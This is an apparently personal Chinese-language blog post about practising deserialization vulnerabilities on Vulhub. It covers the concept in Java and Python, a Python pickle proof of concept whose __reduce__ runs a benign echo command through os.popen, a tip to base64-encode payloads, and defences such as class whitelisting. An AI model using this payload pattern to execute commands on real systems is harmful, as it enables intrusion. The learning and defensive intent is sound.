---

layout: post

title: "Vulhub 2 反序列化"

author: "markt"

---



复现fastjson试了半天还是显示报错，真的佛了。可能我这辈子跟JAVA过不去吧。。后来又试了一个JBoss 的典型反序列化，直接用现成的工具也很无聊。之后研究了一下Python的反序列化还是蛮有意思的。

## 反序列化漏洞的定义

所谓的序列化，简答来说就是把对象存储成数据的一种方式，目前在JAVA中最常见。而反序列化就是从数据中读取对象。而在反序列化的过程中，若是构造恶意的方法被当作正常对象的方法执行，便有了反序列化的漏洞。

举一个简单场景的例子，客户端以json的形式把一个对象实例传向服务端，如果json的数据被修改，那么原有对象的方法就会变成恶意方法。

不论是什么语言，如果有这样的需求，那么很显然都会有对象被篡改的危险。其中以java最常见，php次之，python什么的都还很少见。java中是ObjectInputStream 类的readObject（需要实现`Serializable`接口），python中是`__reduce__`。简单来说，反序列化漏洞的关键在于重载对应的方法，即上述两种语言对应的方法。

知道了核心之后，另外需要注意的部分除了绕过黑名单（如果有的话），就是对payload的处理了——将payload转换成base64避免不支持管道符等字符。

## 一个不规范的python反序列化漏洞POC：

```
import pickle
import os
class a(object):
    def __reduce__(self):
        payload = """echo adas1 > e1 """
        return (os.popen,(payload,))
aa = a()
def w2f(aa=aa):
    with open('d','wb') as f:
        p = pickle.dump(aa,f)
        print('save to file:',type(aa),aa)

def r2f(aa=aa):
    with open('d','rb') as f:
        b = pickle.load(f)
        print('load from file:',type(b),b)
        b.s()
    return b
#import pdb;pdb.set_trace()
p = pickle.dumps(aa)
pickle.dump(aa,open('w2','wb'))
#print(p)
with open('w1','wb') as f:
    pp = f.write(p)
#print(pp,type(pp))
e = pickle.loads(p)
print(e,type(e))


```

## 防御

说到防御，最简单粗暴的还是白名单过滤危险的方法吧。

以下是百度到的：

> **1. 类白名单校验**
>
> 在 ObjectInputStream 中 resolveClass 里只是进行了 class 是否能被 load ，自定义 ObjectInputStream , 重载 resolveClass 的方法，对 className 进行白名单校验
>
> **2. 禁止 JVM 执行外部命令 Runtime.exec**
>
> 通过扩展 SecurityManager 可以实现.

## 参考链接

[深入理解 JAVA 反序列化漏洞](https://paper.seebug.org/312/)

[Python Pickle的任意代码执行漏洞实践和Payload构造](http://www.polaris-lab.com/index.php/archives/178/)

[掌阅iReader某站Python漏洞挖掘](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)